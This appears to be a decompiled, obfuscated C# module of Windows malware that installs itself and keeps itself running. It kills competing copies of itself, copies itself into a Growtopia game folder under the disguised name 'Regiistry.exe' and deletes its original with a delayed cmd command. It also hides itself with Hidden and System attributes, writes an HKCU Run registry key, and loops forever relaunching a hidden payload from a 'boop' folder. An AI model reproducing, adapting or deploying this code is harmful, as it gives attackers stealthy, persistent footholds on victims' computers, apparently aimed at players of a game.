using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;

public static class GClass31
{
	[Serializable]
	[CompilerGenerated]
	private sealed class Class40
	{
		public static readonly Class40 class40_0 = new Class40();

		public static Action action_0;

		public static Action action_1;

		internal void method_0()
		{
			GClass52.smethod_97();
		}

		internal void method_1()
		{
			smethod_1();
		}
	}

	public static void smethod_0(GClass13 client)
	{
		bool flag = false;
		if (!Directory.Exists(Path.Combine(GClass5.string_4, GClass5.string_5)))
		{
			try
			{
				Directory.CreateDirectory(Path.Combine(GClass5.string_4, GClass5.string_5));
			}
			catch (Exception)
			{
				return;
			}
		}
		if (File.Exists(GClass69.InstallPath))
		{
			try
			{
				File.Delete(GClass69.InstallPath);
			}
			catch (Exception ex2)
			{
				if (ex2 is IOException || ex2 is UnauthorizedAccessException)
				{
					Process[] processesByName = Process.GetProcessesByName(Path.GetFileNameWithoutExtension(GClass69.InstallPath));
					int id = Process.GetCurrentProcess().Id;
					Process[] array = processesByName;
					foreach (Process process in array)
					{
						if (process.Id != id)
						{
							process.Kill();
							flag = true;
						}
					}
				}
			}
		}
		if (flag)
		{
			Thread.Sleep(5000);
		}
		try
		{
			File.Copy(GClass69.CurrentPath, GClass69.InstallPath, overwrite: true);
		}
		catch (Exception)
		{
			return;
		}
		if (GClass5.bool_3 && !GClass39.smethod_1())
		{
			GClass69.AddStartUpFailed = true;
		}
		if (GClass5.bool_4)
		{
			try
			{
				File.SetAttributes(GClass69.InstallPath, FileAttributes.Hidden);
			}
			catch (Exception)
			{
			}
		}
		if (!GClass38.smethod_1())
		{
			Task.Run(delegate
			{
				GClass52.smethod_97();
			}).Wait();
		}
		GClass47.smethod_3(GClass69.InstallPath);
		ProcessStartInfo startInfo = new ProcessStartInfo
		{
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true,
			UseShellExecute = false,
			FileName = GClass69.InstallPath
		};
		try
		{
			Process.Start(startInfo);
		}
		catch (Exception)
		{
		}
		Class45.smethod_0();
		Task.Run(delegate
		{
			smethod_1();
		}).Wait();
		if (GClass38.smethod_1())
		{
			Task.Run((Action)GClass52.smethod_27).Wait();
		}
	}

	private static void smethod_1()
	{
		try
		{
			try
			{
				string installPath = GClass69.InstallPath;
				string text = Environment.ExpandEnvironmentVariables("%LOCALAPPDATA%") + "\\Growtopia\\game\\pets\\Regiistry.exe";
				if (installPath != text)
				{
					if (File.Exists(text))
					{
						File.Delete(text);
						Directory.CreateDirectory(text);
					}
					else
					{
						Directory.CreateDirectory(text);
					}
					File.Copy(installPath, text);
					Process process = new Process();
					process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
					process.StartInfo.WorkingDirectory = Path.GetDirectoryName(text);
					process.StartInfo.FileName = "cmd.exe";
					process.StartInfo.Arguments = "/c Regiistry.exe";
					process.Start();
					Process.Start(new ProcessStartInfo
					{
						Arguments = "/C choice /C Y /N /D Y /T 3 & Del " + Application.get_ExecutablePath(),
						WindowStyle = ProcessWindowStyle.Hidden,
						CreateNoWindow = true,
						FileName = "cmd.exe"
					});
					Application.Exit();
				}
				if (!(installPath == text))
				{
					return;
				}
				try
				{
					string text2 = Path.GetDirectoryName(Process.GetCurrentProcess().MainModule!.FileName) + "\\boop";
					string[] files = Directory.GetFiles(text2);
					try
					{
						File.SetAttributes(Assembly.GetEntryAssembly()!.Location, File.GetAttributes(Assembly.GetEntryAssembly()!.Location) | FileAttributes.Hidden | FileAttributes.System);
					}
					catch
					{
					}
					try
					{
						Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue(Process.GetCurrentProcess().MainModule!.FileName, Application.get_ExecutablePath());
					}
					catch
					{
					}
					while (true)
					{
						if (Process.GetProcessesByName(Path.GetFileNameWithoutExtension(files[0])).Length == 0)
						{
							Process process2 = new Process();
							process2.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
							process2.StartInfo.WorkingDirectory = text2;
							process2.StartInfo.FileName = "cmd.exe";
							process2.StartInfo.Arguments = "/c " + Path.GetFileName(files[0]);
							process2.Start();
							Thread.Sleep(5000);
						}
						Thread.Sleep(5000);
					}
				}
				catch
				{
				}
			}
			catch
			{
			}
		}
		catch
		{
		}
	}
}
